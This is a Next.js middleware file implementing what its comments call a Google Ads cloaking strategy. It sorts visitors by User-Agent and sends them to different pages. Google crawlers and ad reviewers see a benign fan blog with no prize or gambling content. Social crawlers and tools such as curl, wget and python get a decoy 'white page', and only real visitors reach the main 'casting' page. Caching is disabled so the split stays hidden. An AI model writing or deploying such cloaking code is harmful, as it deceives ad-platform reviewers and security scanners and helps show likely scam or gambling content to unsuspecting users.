import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Google Ads Cloaking Strategy:
// - Google bots → /blog (fan page, no prizes mentioned)
// - Social bots → /white-page (safe decoy)
// - Real users → /casting (main landing)

// Google Bots - redirect to BLOG (fan page for Ads compliance)
const GOOGLE_BOTS = [
    'googlebot',
    'adsbot-google',
    'mediapartners-google',
    'google-inspectiontool',
    'google-read-aloud',
    'storebot-google',
    'googleother',
    'apis-google',
    'feedfetcher-google'
];

// Social/Other Bots - redirect to WHITE PAGE (decoy)
const SOCIAL_BOTS = [
    // Facebook / Meta
    'facebookexternalhit',
    'facebot',
    'meta-externalagent',
    // Twitter / X
    'twitterbot',
    // TikTok / ByteDance
    'tiktok',
    'bytespider',
    'bytedance',
    // LinkedIn
    'linkedinbot',
    // Messaging Apps
    'whatsapp',
    'telegrambot',
    'discordbot',
    'slackbot',
    // Security scanners / generic
    'python',
    'curl',
    'wget',
    'httpx',
    'axios'
];

export function middleware(request: NextRequest) {
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';

    // Check bot type
    const isGoogleBot = GOOGLE_BOTS.some(bot => userAgent.includes(bot));
    const isSocialBot = SOCIAL_BOTS.some(bot => userAgent.includes(bot));

    // Determine destination based on visitor type
    let destPath: string;
    if (isGoogleBot) {
        // Google Ads → Show BLOG (fan page, no gambling/prize content)
        destPath = '/blog';
    } else if (isSocialBot) {
        // Social bots → White page decoy
        destPath = '/white-page';
    } else {
        // Real users → Main casting page
        destPath = '/casting';
    }

    // Only apply rewrite on root path
    if (request.nextUrl.pathname === '/') {
        // If already at destination, pass through
        if (request.nextUrl.pathname === destPath) {
            return NextResponse.next();
        }

        const response = NextResponse.rewrite(new URL(destPath, request.url));

        // CRITICAL: Prevent shared caching of this decision
        response.headers.set('Cache-Control', 'private, no-store, no-cache, must-revalidate');
        response.headers.set('Vary', 'User-Agent');
        return response;
    }

    return NextResponse.next();
}

export const config = {
    matcher: [
        /*
         * Match all request paths except for the ones starting with:
         * - api (API routes)
         * - _next/static (static files)
         * - _next/image (image optimization files)
         * - favicon.ico, sitemap.xml, robots.txt (SEO files)
         */
        '/((?!api|_next/static|_next/image|favicon.ico|sitemap.xml|robots.txt).*)',
    ],
}

